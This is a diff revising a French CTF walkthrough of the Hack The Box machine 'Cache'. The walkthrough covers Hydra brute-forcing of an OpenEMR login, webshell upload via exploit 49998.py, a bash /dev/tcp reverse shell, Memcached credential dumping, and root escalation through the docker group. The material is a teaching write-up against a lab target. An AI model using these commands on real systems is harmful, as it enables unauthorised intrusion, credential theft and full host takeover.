@@ -1023,7 +1023,7 @@ Pour commencer, tu testes :
 /portal/add_edit_event_user.php
 ```
 
-Tu lances alors `50017.py` sur cette ressource :
+Depuis le répertoire `hms/50017`, tu lances alors `50017.py` sur cette ressource :
 
 ```bash
 python3 50017.py \
@@ -1149,9 +1149,9 @@ Il faut maintenant déterminer ce mot de passe. Tu commences donc par examiner l
 
 ### Recherche du mot de passe de `openemr_admin`
 
-Pour rechercher ce mot de passe, tu choisis d’utiliser `Hydra`, qui permet de tester automatiquement une liste de mots de passe sur un formulaire de connexion HTTP.
+Tu disposes maintenant d’une page de connexion OpenEMR et d’un nom d’utilisateur valide, `openemr_admin`. Dans ce contexte, l’outil qui vient naturellement à l’esprit est `Hydra`, puisqu’il permet de tester automatiquement une liste de mots de passe sur un formulaire d’authentification HTTP.
 
-Avant de construire la commande Hydra, tu dois identifier les éléments nécessaires pour reproduire la requête d’authentification :
+Avant de construire la commande Hydra, tu dois identifier les éléments nécessaires pour reproduire correctement la requête d’authentification :
 
 - l’URL vers laquelle les identifiants sont envoyés ;
 - les paramètres transmis dans la requête ;
@@ -1159,11 +1159,15 @@ Avant de construire la commande Hydra, tu dois identifier les éléments nécess
 - le champ contenant le mot de passe ;
 - un élément permettant de reconnaître un échec d’authentification.
 
-Tu utilises `Burp Suite` pour intercepter une tentative de connexion et relever ces différents éléments.
+Pour relever ces différents éléments, tu interceptes une tentative de connexion avec `Burp Suite`.
 
 #### Identification des paramètres avec Burp Suite
 
 Tu ouvres `Burp Suite` et configures ton navigateur pour faire passer ses requêtes par le proxy.
+
+Si besoin, tu peux te référer à la recette dédiée pour configurer Burp Suite Community Edition avec FoxyProxy :
+
+{{< recette "burp-suite-community-edition-avec-foxyproxy" >}}
 
 Sur la page de connexion d’OpenEMR, tu saisis le nom d’utilisateur `openemr_admin` et un mot de passe volontairement incorrect, par exemple `test`.
 
@@ -1171,7 +1175,9 @@ Tu interceptes la tentative de connexion dans Burp Suite, puis tu envoies la req
 
 ![Tentative de connexion OpenEMR avec un mauvais mot de passe dans Burp Suite](hms-htb-loginbad-password-burp-suite.png)
 
-La requête utilise la méthode HTTP `POST` vers l’URL suivante :
+Dans Repeater, tu peux maintenant examiner précisément la requête envoyée par le formulaire.
+
+Elle utilise la méthode HTTP `POST` vers l’URL suivante :
 
 ```text
 /interface/main/main_screen.php?auth=login&site=default
@@ -1185,37 +1191,38 @@ Le corps de la requête contient les paramètres suivants :
 new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=test
 ```
 
-Le nom d’utilisateur est transmis dans le paramètre `authUser`, tandis que le mot de passe est transmis dans `clearPass`.
+Tu identifies ainsi les deux champs qui nous intéressent :
 
-Comme le nom d’utilisateur `openemr_admin` est déjà connu, seule la valeur du paramètre `clearPass` doit varier. Dans la commande Hydra, tu la remplaces par le marqueur `^PASS^` :
+- `authUser` contient le nom d’utilisateur ;
+- `clearPass` contient le mot de passe.
+
+Comme le nom d’utilisateur `openemr_admin` est déjà connu, seule la valeur du paramètre `clearPass` doit varier. Hydra utilise le marqueur `^PASS^` pour indiquer l’emplacement où il doit tester successivement les mots de passe de la liste :
 
 ```bash
 clearPass=^PASS^
 ```
 
-Les données `POST` utilisées par Hydra prennent donc la forme suivante :
+Tu reprends donc le corps de la requête observée dans Burp et remplaces uniquement la valeur du mot de passe par `^PASS^` :
 
 ```bash
 new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
 ```
 
-Il reste à identifier un élément permettant à Hydra de reconnaître un échec d’authentification.
+Il reste maintenant à indiquer à Hydra comment reconnaître une tentative de connexion échouée.
 
-La réponse à cette tentative incorrecte contient l’instruction JavaScript suivante :
+Dans la réponse renvoyée après le mot de passe incorrect `test`, tu repères la ligne suivante :
 
 ```bash
 w.top.location.href = '/interface/login_screen.php?error=1&site=';
 ```
 
-Le marqueur `error=1` apparaît donc dans la réponse lorsqu’une authentification échoue.
-
-Tu utilises donc `error=1` comme marqueur d’échec dans Hydra :
+La chaîne `error=1` apparaît donc lors d’un échec d’authentification. Tu peux l’utiliser comme condition d’échec dans Hydra :
 
 ```
 F=error=1
 ```
 
-Tu disposes maintenant de tous les éléments nécessaires pour construire la commande Hydra :
+Tu disposes maintenant de tous les éléments nécessaires pour construire la requête Hydra :
 
 ```text
 Utilisateur        : openemr_admin
@@ -1229,7 +1236,7 @@ Marqueur d’échec   : error=1
 
 #### Attaque par dictionnaire avec Hydra
 
-Avant de lancer l’attaque par dictionnaire, tu reviens dans le répertoire de travail `hms` :
+Comme tu te trouves encore dans le répertoire `hms/50017`, tu reviens d’abord dans le répertoire de travail `hms` :
 
 ```
 cd ..
@@ -1258,7 +1265,7 @@ hms/
 
 Cette première liste ne vise pas encore à trouver le mot de passe. Elle sert surtout à vérifier que Hydra reproduit correctement la requête observée dans Burp Suite et reconnaît bien le marqueur d’échec.
 
-Tu lances alors Hydra avec cette liste de test :
+Tu lances alors Hydra avec cette liste de test afin de vérifier que la requête est correctement reproduite et que les échecs d’authentification sont bien détectés :
 
 ```bash
 hydra -l openemr_admin \
@@ -1272,31 +1279,31 @@ http-post-form \
 
 L’option `-l` indique le nom d’utilisateur déjà connu, tandis que `-P` désigne le fichier contenant les mots de passe à tester.
 
-Le module `http-post-form` attend ensuite trois éléments séparés par des deux-points :
+Le module `http-post-form` attend trois éléments séparés par des deux-points :
 
 ```text
 <URL>:<données envoyées>:<condition d’échec>
 ```
 
-Dans cette commande, les trois éléments correspondent à :
+Dans cette commande, ils correspondent à :
 
-```url
+```text
 /interface/main/main_screen.php?auth=login&site=default
 ```
 
-correspond à l’URL de destination de la requête ;
+l’URL qui reçoit la requête de connexion ;
 
-```bash
+```text
 new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
 ```
 
-reproduit le corps de la requête `POST`. Hydra remplace `^PASS^` par chaque mot de passe de la liste ;
+le corps de la requête `POST` observé dans Burp. Hydra remplace `^PASS^` par chaque mot de passe de la liste ;
 
-```bash
+```text
 F=error=1
 ```
 
-indique que la présence de `error=1` dans la réponse signale un échec d’authentification.
+la condition d’échec : si `error=1` apparaît dans la réponse, Hydra considère que l’authentification a échoué.
 
 L’option `-t 1` limite Hydra à une seule tâche simultanée pour cette phase de validation, tandis que `-V` affiche chaque tentative effectuée.
 
@@ -1317,16 +1324,16 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [date]
 
 ```
 
-Les quatre mots de passe sont correctement reconnus comme des échecs. Cela confirme que Hydra reproduit correctement la requête et que le marqueur `F=error=1` permet d’identifier les authentifications refusées.
+Les quatre mots de passe de test sont correctement identifiés comme des échecs. Cela confirme que Hydra reproduit correctement la requête d’authentification et que le marqueur `F=error=1` permet de reconnaître une connexion refusée.
 
-Tu prépares maintenant une liste plus importante en extrayant les 10 000 premiers mots de passe de RockYou :
+Le fonctionnement de la commande étant validé, tu peux maintenant passer à une liste de mots de passe plus réaliste. Tu extrais par exemple les 10 000 premières entrées de RockYou :
 
 ```bash
 head -n 10000 /usr/share/wordlists/rockyou.txt \
   > hydra/rockyou-10000.txt
 ```
 
-Cette limitation évite de tester immédiatement l’intégralité de la wordlist et permet de commencer par les mots de passe les plus courants.
+Cette limitation permet de commencer par les mots de passe les plus courants sans lancer immédiatement l’intégralité de la wordlist RockYOU.
 
 Tu relances ensuite Hydra avec cette liste de 10 000 mots de passe :
 
@@ -1340,31 +1347,31 @@ hydra -l openemr_admin \
   -V
 ```
 
-Hydra teste successivement les mots de passe de la liste jusqu’à identifier une combinaison valide :
+Hydra teste successivement les mots de passe de la liste. Dans ce cas, il finit par identifier une combinaison valide :
 
 ```text
 [80][http-post-form] host: hms.htb   login: openemr_admin   password: xxxxxx
 ```
 
-Tu disposes désormais des identifiants suivants :
+Tu disposes désormais d’identifiants OpenEMR valides :
 
 ```text
 openemr_admin:xxxxxx
 ```
 
-Avant d’utiliser ces identifiants avec les exploits OpenEMR authentifiés, tu vérifies s’ils correspondent aussi à un compte local accessible en SSH :
+Avant de les utiliser avec les exploits OpenEMR authentifiés, tu peux vérifier si ces identifiants ont également été réutilisés pour un compte local accessible en SSH.
 
 ```bash
 ssh openemr_admin@cache.htb
 ```
 
-Le mot de passe découvert avec Hydra n’est toutefois pas accepté en SSH. Les identifiants `openemr_admin` semblent donc être propres à l’application OpenEMR.
+Le mot de passe découvert avec Hydra n’est toutefois pas accepté en SSH. Rien n’indique donc, à ce stade, que ces identifiants soient réutilisés pour un compte local.
 
-Tu disposes maintenant des identifiants nécessaires pour tester les exploits OpenEMR authentifiés `49998.py` et `45161.py`.
+Tu disposes maintenant des identifiants OpenEMR nécessaires pour tester les exploits authentifiés `49998.py` et `45161.py`.
 
 ### Analyse de l’exploit `49998.py`
 
-Depuis le répertoire de travail `hms`, tu crées un sous-répertoire dédié à l’exploit `49998.py`, puis tu y copies le script avec `searchsploit` :
+Depuis le répertoire de travail `hms`, tu crées un sous-répertoire dédié à l’exploit `49998.py`, puis tu copies le script avec `searchsploit` :
 
 ```bash
 mkdir -p 49998
@@ -1373,35 +1380,31 @@ cd 49998
 searchsploit -m php/webapps/49998.py
 ```
 
-Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’examiner son en-tête, ses commentaires et les différentes étapes de l’exploitation :
+Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’en comprendre le fonctionnement général et les différentes étapes de l’exploitation :
 
 ```bash
 nano 49998.py
 ```
 
-L’en-tête indique que le script exploite la vulnérabilité suivante :
+L’en-tête indique que le script exploite la vulnérabilité `CVE-2018-15139`.
 
-```text
-CVE-2018-15139
-```
-
-Le script commence par s’authentifier auprès d’OpenEMR avec un compte valide, puis tente d’accéder à la page suivante :
+Après s’être authentifié auprès d’OpenEMR avec un compte valide, le script accède à la page suivante :
 
 ```text
 /interface/super/manage_site_files.php
 ```
 
-Cette fonctionnalité permet normalement de gérer certains fichiers du site. L’exploit en abuse pour envoyer une webshell PHP nommée :
+Cette page permet normalement de gérer certains fichiers du site OpenEMR. L’exploit détourne cette fonctionnalité pour y déposer une webshell PHP nommée :
 
 ```text
 shell.php
 ```
 
-Le script intègre directement une webshell complète basée sur `p0wny@shell`.
+Le script intègre directement une webshell basée sur `p0wny@shell`.
 
-`p0wny@shell` est une webshell PHP légère qui fournit, depuis un navigateur, une interface permettant d’exécuter des commandes sur le serveur avec les privilèges du compte utilisé par le serveur web.
+`p0wny@shell` est une webshell PHP légère qui permet d’exécuter des commandes sur le serveur depuis une interface web, avec les privilèges du compte utilisé par le serveur web.
 
-Si l’envoi réussit, la webshell doit être déposée dans le répertoire des images du site OpenEMR par défaut et devenir accessible à l’adresse suivante :
+Si l’envoi réussit, la webshell doit être déposée dans le répertoire des images du site OpenEMR et devenir accessible à l’adresse suivante :
 
 ```url
 http://hms.htb/sites/default/images/shell.php
@@ -1458,7 +1461,7 @@ Les paramètres attendus sont les suivants :
 -p  mot de passe OpenEMR
 ```
 
-OpenEMR est directement accessible à la racine de `hms.htb`. Le paramètre `-U` peut donc recevoir une valeur vide.
+OpenEMR est directement accessible à la racine de `hms.htb`, sans sous-répertoire supplémentaire. Le paramètre `-U`, qui représente le chemin de base de l’installation, peut donc rester vide :
 
 La commande d’exploitation prend ainsi la forme suivante :
 
@@ -1477,19 +1480,19 @@ Le script indique que la webshell doit être accessible à l’adresse suivante 
 http://hms.htb/sites/default/images/shell.php
 ```
 
-En ouvrant cette URL dans le navigateur, tu obtiens bien l’interface de la webshell.
+Tu ouvres cette URL dans le navigateur afin de vérifier que l’envoi a réussi. L’interface de `p0wny@shell` s’affiche bien.
 
 ![Webshell p0wny@shell exécutant la commande id en tant que www-data](cache-htb-hms-htb-p0wny-shell.png)
 
 L’envoi a bien fonctionné : l’interface de `p0wny@shell` s’affiche et permet d’exécuter des commandes sur la cible.
 
-Pour vérifier sous quel compte les commandes sont exécutées, tu saisis :
+Pour identifier le compte sous lequel elles sont exécutées, tu saisis :
 
 ```bash
 id
 ```
 
-La réponse confirme que les commandes sont exécutées avec les privilèges de l’utilisateur du serveur web :
+La réponse montre que la webshell s’exécute sous le compte `www-data` :
 
 ```bash
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -1499,7 +1502,7 @@ L’exploit `49998.py` permet donc d’obtenir directement une exécution de com
 
 ### Identification des utilisateurs locaux
 
-Depuis la webshell, tu examines le contenu du répertoire `/home` afin d’identifier les utilisateurs locaux présents sur la machine :
+Depuis la webshell, tu examines le contenu de `/home` afin d’identifier les comptes utilisateurs disposant d’un répertoire personnel :
 
 ```bash
 ls -l /home
@@ -1513,20 +1516,20 @@ drwxr-xr-x 11 ash   ash   4096 May  6  2020 ash
 drwxr-x---  5 luffy luffy 4096 May  6  2020 luffy
 ```
 
-Deux utilisateurs locaux possèdent donc un répertoire personnel :
+Deux comptes disposent donc d’un répertoire personnel sous `/home` :
 
 ```text
 ash
 luffy
 ```
 
-Le répertoire de `luffy` n’est accessible qu’à son propriétaire et aux membres de son groupe :
+Le répertoire personnel de `luffy` n’est accessible qu’à son propriétaire et aux membres de son groupe :
 
 ```text
 drwxr-x--- 5 luffy luffy
 ```
 
-En revanche, les permissions du répertoire de `ash` permettent à `www-data` d’en consulter le contenu. Tu l’énumères donc avec :
+En revanche, les permissions du répertoire personnel de `ash` autorisent les autres utilisateurs à le parcourir. `www-data` peut donc en examiner le contenu :
 
 ```bash
 ls -l /home/ash
@@ -1545,15 +1548,15 @@ drwxrwxr-x 2 root root 4096 Oct  9  2019 Public
 -r-x------ 1 ash  ash    33 Jul 31 08:11 user.txt
 ```
 
-Le fichier `user.txt` est bien présent, mais ses permissions montrent qu’il ne peut être lu que par son propriétaire :
+Le fichier `user.txt` est bien présent. Ses permissions montrent que seul son propriétaire, `ash`, dispose d’un droit d’accès :
 
 ```text
 -r-x------ 1 ash ash 33 Jul 31 08:11 user.txt
 ```
 
-L’accès obtenu en tant que `www-data` ne suffit donc pas encore pour lire le flag utilisateur.
+Le shell obtenu en tant que `www-data` ne permet donc pas de lire le flag utilisateur.
 
-Les identifiants `ash:H@v3_fun`, découverts au début de l’énumération, n’ont jusqu’à présent permis ni de se connecter en SSH ni d’accéder à OpenEMR. Comme `user.txt` appartient à `ash` et n’est pas lisible par `www-data`, tu peux maintenant tester ces identifiants directement depuis le shell en tentant de basculer vers l’utilisateur `ash` avec `su`.
+Les identifiants `ash:H@v3_fun`, découverts au début de l’énumération, n’ont jusqu’à présent fonctionné ni en SSH ni sur OpenEMR. Comme `user.txt` appartient à `ash` et n’est pas lisible par `www-data`, tu peux maintenant tester ce mot de passe directement avec `su`.
 
 Depuis la webshell, tu tentes donc de basculer vers l’utilisateur `ash` :
 
@@ -1567,51 +1570,47 @@ La tentative échoue avec le message suivant :
 su: must be run from a terminal
 ```
 
-Cette erreur ne signifie pas que le mot de passe est incorrect. Elle indique simplement que `su` a besoin d’un terminal interactif pour demander le mot de passe.
+Cette erreur n’indique pas que le mot de passe est incorrect. Elle signifie simplement que `su` a besoin d’un terminal interactif pour demander le mot de passe.
 
-La webshell `p0wny@shell` permet d’exécuter des commandes, mais ne fournit pas de terminal interactif. Il faut donc obtenir un reverse shell avant de pouvoir réessayer la commande `su`.
+La webshell `p0wny@shell` permet bien d’exécuter des commandes, mais elle ne fournit pas ce type de terminal. Il faut donc obtenir un reverse shell avant de réessayer `su`.
 
 ### Obtention d’un reverse shell en tant que `www-data`
 
-Pour obtenir un terminal interactif permettant notamment d’utiliser `su`, tu commences par lancer un listener sur Kali :
+Pour obtenir un shell plus interactif permettant notamment d’utiliser `su`, tu commences par lancer un listener sur Kali :
 
 ```bash
 rlwrap -cAr nc -lvnp 4444
 ```
 
-Depuis `p0wny@shell`, tu exécutes ensuite un reverse shell Bash vers l’adresse IP de l’interface `tun0` de Kali :
+Depuis `p0wny@shell`, tu exécutes ensuite un reverse shell Bash vers l’adresse IP de l’interface `tun0` de Kali, sur le port `4444` :
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'
 ```
 
-Le listener reçoit alors la connexion depuis la cible :
+Le listener reçoit alors une connexion en provenance de la cible :
 
 ```text
 connect to [10.10.x.x] from [10.129.x.x]
 ```
 
-Tu obtiens un shell en tant que `www-data` :
+Tu disposes maintenant d’un reverse shell sous le compte `www-data` :
 
 ```text
 www-data@cache:/var/www/hms.htb/public_html/sites/default/images$
 ```
 
-Ce shell reste rudimentaire. Tu le stabilises en suivant la recette dédiée :
+Ce reverse shell reste rudimentaire et ne se comporte pas encore comme un vrai terminal interactif. Tu le stabilises donc en suivant la recette dédiée :
 
 {{< recette "stabiliser-reverse-shell" >}}
 
-Tu commences par créer un pseudo-terminal avec Python afin de rendre le shell plus interactif :
+Tu crées d’abord un pseudo-terminal avec Python :
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Tu places ensuite le shell en arrière-plan avec :
-
-```text
-Ctrl+Z
-```
+Tu places ensuite le shell en arrière-plan avec `Ctrl+Z`, puis dans Kali :
 
 Puis, dans le terminal Kali, tu exécutes :
 
@@ -1640,25 +1639,25 @@ export TERM=xterm
 
 ### Passage à l’utilisateur `ash`
 
-Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer de basculer vers le compte `ash` :
+Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer `su` vers le compte `ash` :
 
 ```bash
 su - ash
 ```
 
-Lorsque le mot de passe est demandé, tu saisis celui découvert au début de l’énumération :
+Lorsque le mot de passe est demandé, tu utilises celui découvert dans `functionality.js` :
 
 ```text
 H@v3_fun
 ```
 
-Cette fois, l’authentification réussit et tu bascules vers le compte `ash` :
+Cette fois, l’authentification réussit et tu obtiens un shell sous le compte `ash` :
 
 ```text
 ash@cache:~$
 ```
 
-Tu vérifies ton identité avec :
+Tu vérifies ton identité :
 
 ```bash
 id
@@ -1672,7 +1671,7 @@ uid=1000(ash) gid=1000(ash) groups=1000(ash)
 
 ### Lecture du flag `user.txt`
 
-Tu lis enfin le flag utilisateur :
+Tu peux maintenant lire le flag utilisateur :
 
 ```bash
 cat /home/ash/user.txt
@@ -1693,13 +1692,13 @@ Tu peux maintenant poursuivre l’énumération locale afin de rechercher une po
 sudo -l
 ```
 
-La commande demande le mot de passe de `ash`, puis indique qu’il ne peut exécuter aucune commande avec `sudo` :
+La commande demande le mot de passe de `ash`, puis indique qu’aucune commande ne lui est autorisée via `sudo` :
 
 ```
 Sorry, user ash may not run sudo on cache.
 ```
 
-Cette piste ne permet donc pas d’élever directement les privilèges.
+La piste `sudo` peut donc être écartée.
 
 ### Capabilities
 
@@ -1707,17 +1706,42 @@ Cette piste ne permet donc pas d’élever directement les privilèges.
 getcap -r / 2>/dev/null
 ```
 
-Les capabilities permettent d’accorder à un programme certains privilèges normalement réservés à `root`, sans lui attribuer l’ensemble de ses droits. La recherche ne révèle toutefois aucun binaire exploitable dans ce contexte.
+Les capabilities permettent d’accorder à un programme certains privilèges normalement réservés à `root`, sans lui attribuer l’ensemble des privilèges du superutilisateur. 
+
+La commande ne retourne aucun binaire présentant une capability exploitable dans ce contexte.
+
+La piste des capabilities peut donc être écartée.
 
 ### SUID
 
-Tu poursuis avec `suid3num.py` afin d’examiner les fichiers possédant le bit SUID :
+Tu poursuis avec `suid3num.py` afin d’identifier les fichiers possédant le bit SUID.
+
+Comme le script se trouve sur Kali, tu le transfères d’abord vers la cible en suivant la recette dédiée :
+
+```text
+{{< recette "copier-fichiers-kali" >}}
+```
+
+Depuis Kali, dans le répertoire contenant `suid3num.py`, tu lances par exemple un serveur HTTP :
+
+```bash
+python3 -m http.server 8000
+```
+
+Sur la cible, tu te places dans `/dev/shm` puis tu récupères le script :
+
+```bash
+cd /dev/shm
+wget http://10.10.x.x:8000/suid3num.py
+```
+
+Tu peux ensuite l’exécuter :
 
 ```bash
 python3 suid3num.py
 ```
 
-Un binaire SUID s’exécute avec les privilèges de son propriétaire plutôt qu’avec ceux de l’utilisateur qui le lance. L’outil ne met cependant en évidence aucun binaire personnalisé ou directement exploitable pour obtenir `root`.
+Lorsqu’un exécutable possède le bit SUID, il s’exécute avec les privilèges de son propriétaire plutôt qu’avec ceux de l’utilisateur qui le lance. Ici, l’outil ne met en évidence aucun binaire personnalisé ou exploitable pour obtenir `root`.
 
 ```bash
 [~] Custom SUID Binaries (Interesting Stuff)
@@ -1729,18 +1753,21 @@ Un binaire SUID s’exécute avec les privilèges de son propriétaire plutôt q
 ------------------------------
 [!] None :(
 ------------------------------
-
 ```
 
+L’outil ne met en évidence aucun binaire SUID personnalisé ou directement exploitable pour obtenir `root`.
 
+La piste SUID peut donc être écartée.
 
 ### Services locaux
+
+Les premières pistes classiques n’ayant rien révélé d’exploitable, tu poursuis l’énumération locale en recherchant les services qui écoutent sur la machine :
 
 ```bash
 ss -tulnp
 ```
 
-Cette commande affiche les sockets TCP et UDP en écoute ainsi que leurs adresses et leurs ports. Elle permet notamment de repérer les services accessibles uniquement depuis la machine locale.
+Cette commande affiche les sockets TCP et UDP en écoute, avec leurs adresses et leurs ports. Elle permet notamment d’identifier des services accessibles uniquement localement et donc invisibles depuis l’extérieur.
 
 La sortie montre plusieurs services en écoute :
 
@@ -1759,7 +1786,7 @@ tcp    LISTEN   0        128                                          *:80      
 
 Les ports `22` et `80` correspondent aux services déjà identifiés pendant l’énumération initiale.
 
-Deux autres services écoutent uniquement sur l’interface locale :
+Deux autres services écoutent uniquement sur l’interface loopback :
 
 ```
 127.0.0.1:3306
@@ -1768,44 +1795,44 @@ Deux autres services écoutent uniquement sur l’interface locale :
 
 Le port `3306` correspond à MySQL, utilisé par OpenEMR.
 
-Le port `11211` mérite davantage d’attention, car il est généralement associé au service de cache **Memcached**.
+Le port `11211`, en revanche, mérite davantage d’attention : il est généralement associé au service de cache **Memcached**.
 
-Comme ce service n’est accessible que depuis la machine locale, il n’apparaissait pas lors de l’énumération externe. Le shell de `ash` permet désormais de l’interroger directement.
+Comme ce service n’écoute que sur `127.0.0.1`, il n’était pas accessible depuis Kali lors de l’énumération externe. Le shell obtenu sous le compte `ash` permet désormais de l’interroger directement depuis la cible.
 
 ### Identification du service Memcached
 
-Pour vérifier qu’il s’agit bien de **Memcached** et connaître sa version, tu lui envoies la commande `version` :
+Pour confirmer qu’il s’agit bien de Memcached et connaître sa version, tu lui envoies la commande `version` :
 
 ```bash
 printf 'version\r\nquit\r\n' | nc 127.0.0.1 11211
 ```
 
-La commande construit deux instructions destinées au protocole texte de Memcached :
+Ici, `printf` envoie deux commandes au service :
 
-```txt
-version
-quit
-```
+- `version` pour demander sa version ;
+- `quit` pour fermer proprement la connexion.
 
-Les séquences `\r\n` représentent les fins de ligne attendues par le service. Le tube `|` transmet ces commandes à Netcat, qui ouvre une connexion TCP vers `127.0.0.1` sur le port `11211`.
+Les séquences `\r\n` correspondent aux fins de ligne attendues par le protocole texte de Memcached.
+
+Le tube `|` transmet ces commandes à Netcat, qui ouvre une connexion TCP vers `127.0.0.1` sur le port `11211`.
 
 Le serveur répond :
 
-```txt
+```text
 VERSION 1.5.6 Ubuntu
 ```
 
-Cette réponse confirme qu’un service **Memcached 1.5.6** est actif localement.
+Cette réponse confirme qu’un service Memcached 1.5.6 est bien actif sur la machine.
 
-Memcached est utilisé par les applications pour stocker temporairement en mémoire des informations fréquemment consultées. Les données y sont enregistrées sous la forme de couples **clé-valeur**.
+Memcached est un service de cache en mémoire. Les applications peuvent y stocker temporairement des données sous la forme de couples clé-valeur.
 
-Par exemple, une clé peut identifier une donnée mise en cache, tandis que la valeur correspond au contenu qui lui est associé.
+Une clé identifie une donnée mise en cache, tandis que la valeur correspond au contenu qui lui est associé.
 
-Dans une configuration normale, ces données sont destinées à l’application elle-même. Ici, le service écoute uniquement sur l’interface locale et ne demande aucune authentification. Depuis le shell de `ash`, tu peux donc commencer à examiner son contenu.
+Ici, le service n’écoute que sur `127.0.0.1` et ne demande aucune authentification. Depuis le shell de `ash`, tu peux donc commencer à examiner son contenu.
 
 ### Énumération des objets stockés dans Memcached
 
-Maintenant que le service Memcached est identifié, tu peux examiner les objets qu’il contient en demandant les statistiques associées :
+Maintenant que Memcached est identifié et accessible, tu peux commencer à examiner les données qu’il contient. Pour cela, tu demandes les statistiques sur les objets actuellement stockés :
 
 ```bash
 printf 'stats items\r\nquit\r\n' | nc 127.0.0.1 11211
@@ -1844,7 +1871,7 @@ STAT items:1:hits_to_temp 0
 END
 ```
 
-La ligne la plus importante est :
+La sortie contient de nombreuses statistiques, mais une ligne est particulièrement intéressante :
 
 ```bash
 STAT items:1:number 5
@@ -1852,15 +1879,15 @@ STAT items:1:number 5
 
 Elle indique que le slab `1` contient actuellement cinq objets.
 
-Un **slab** est une zone utilisée par Memcached pour regrouper en mémoire les objets de taille similaire. L’identifiant `1` désigne ici le slab dans lequel les cinq objets ont été stockés.
+Dans Memcached, un **slab** regroupe des objets de taille similaire afin d’optimiser leur stockage en mémoire. Ici, l’identifiant `1` correspond donc au slab qui contient les cinq objets détectés.
 
-Tu peux maintenant demander à Memcached d’afficher les clés présentes dans le slab `1` :
+Tu peux maintenant demander à Memcached de lister les clés présentes dans le slab `1` :
 
 ```bash
 printf 'stats cachedump 1 100\r\nquit\r\n' | nc 127.0.0.1 11211
 ```
 
-Le premier argument, `1`, désigne le slab à examiner. Le second, `100`, fixe le nombre maximal d’objets à retourner.
+Le premier argument, `1`, désigne le slab à examiner. Le second, `100`, indique le nombre maximal d’entrées à retourner.
 
 La commande retourne :
 
@@ -1883,11 +1910,13 @@ file
 account
 ```
 
-Tu peux maintenant récupérer la valeur associée à chacune d’elles afin de déterminer quelles informations elles contiennent.
+Ces clés sont particulièrement intéressantes : `user` et `passwd` suggèrent qu’un nom d’utilisateur et un mot de passe pourraient être stockés dans le cache.
+
+Tu peux maintenant récupérer la valeur associée à chacune d’elles.
 
 ### Récupération des valeurs stockées dans Memcached
 
-Pour lire les valeurs associées aux cinq clés, tu utilises une boucle qui envoie successivement une commande `get` à Memcached :
+Pour vérifier ce que contiennent ces cinq clés, tu envoies successivement une commande `get` à Memcached :
 
 ```bash
 for key in link user passwd file account; do
@@ -1933,17 +1962,17 @@ Parmi les données récupérées, les clés `user` et `passwd` fournissent un no
 luffy:0n3_p1ec3
 ```
 
-Comme `luffy` a déjà été identifié comme un utilisateur local dans `/home`, tu peux tester ce mot de passe en ouvrant une session sous son compte avec `su`.
+Comme `luffy` a déjà été identifié parmi les comptes disposant d’un répertoire personnel sous `/home`, tu peux maintenant tester ce mot de passe avec `su`.
 
 ### Passage de `ash` à `luffy`
 
-Tu ouvres une session sous le compte `luffy` :
+Tu tentes alors de basculer vers le compte `luffy` :
 
 ```bash
 su - luffy
 ```
 
-Lorsque le mot de passe est demandé, tu saisis :
+Lorsque le mot de passe est demandé, tu utilises celui récupéré dans Memcached :
 
 ```
 0n3_p1ec3
@@ -1955,33 +1984,35 @@ L’authentification réussit et tu obtiens un shell sous le compte `luffy` :
 luffy@cache:~$
 ```
 
-Tu vérifies ensuite l’identité et les groupes de ce nouvel utilisateur :
+Tu vérifies ensuite l’identité de `luffy` ainsi que les groupes auxquels il appartient :
 
 ```
 id
 ```
 
-La sortie montre notamment que `luffy` appartient au groupe :
+La sortie montre notamment que `luffy` appartient au groupe 999(docker) :
 
 ```
 uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
 ```
 
-Cette appartenance mérite une attention particulière. Sur une installation Docker classique, l’accès au groupe `docker` permet de communiquer avec le démon Docker, qui fonctionne généralement avec les privilèges de `root`. Un tel accès peut donc permettre une élévation de privilèges.
+Cette appartenance mérite une attention particulière. Le groupe `docker` permet généralement d’accéder au socket du démon Docker. Or, le démon Docker s’exécute habituellement avec les privilèges de `root` sur l’hôte.
+
+Un utilisateur capable de piloter Docker peut donc, selon la configuration, lancer un conteneur avec un accès très étendu au système hôte et potentiellement obtenir les privilèges de `root`.
 
 Tu vas maintenant vérifier si `luffy` peut effectivement utiliser Docker et si cette configuration est exploitable.
 
 ### Vérification de l’accès au démon Docker
 
-Tu testes d’abord l’accès de `luffy` au démon Docker :
+Tu vérifies d’abord que `luffy` peut communiquer avec le démon Docker :
 
 ```bash
 docker ps
 ```
 
-La commande ne retourne aucun conteneur en cours d’exécution et ne produit aucune erreur de permission. L’accès à Docker est donc confirmé.
+La commande ne retourne aucun conteneur en cours d’exécution et ne produit aucune erreur de permission. `luffy` peut donc bien utiliser Docker.
 
-Tu vérifies ensuite les images disponibles localement :
+Tu vérifies ensuite quelles images Docker sont disponibles localement :
 
 ```bash
 docker images
@@ -1994,13 +2025,11 @@ REPOSITORY   TAG      IMAGE ID       CREATED        SIZE
 ubuntu       latest   2ca708c1c9cc   6 years ago    64.2MB
 ```
 
-Aucun conteneur n’est actuellement lancé, mais l’image `ubuntu:latest` est disponible et peut être utilisée pour en créer un nouveau.
+L’image `ubuntu:latest` est déjà présente localement. Tu peux donc l’utiliser directement pour créer un nouveau conteneur.
 
-L’objectif consiste maintenant à monter la racine du système hôte dans ce conteneur, puis à l’utiliser comme nouvelle racine avec `chroot`.
+L’idée consiste à monter la racine `/` de la machine hôte dans ce conteneur, puis à utiliser `chroot` pour traiter cette arborescence comme la nouvelle racine du shell.
 
 ### Montage du système de fichiers hôte dans un conteneur
-
-Tu peux maintenant créer un conteneur en montant la racine du système hôte dans son arborescence :
 
 ```bash
 docker run --rm -it \
@@ -2008,6 +2037,10 @@ docker run --rm -it \
   ubuntu:latest \
   chroot /mnt/host /bin/bash
 ```
+
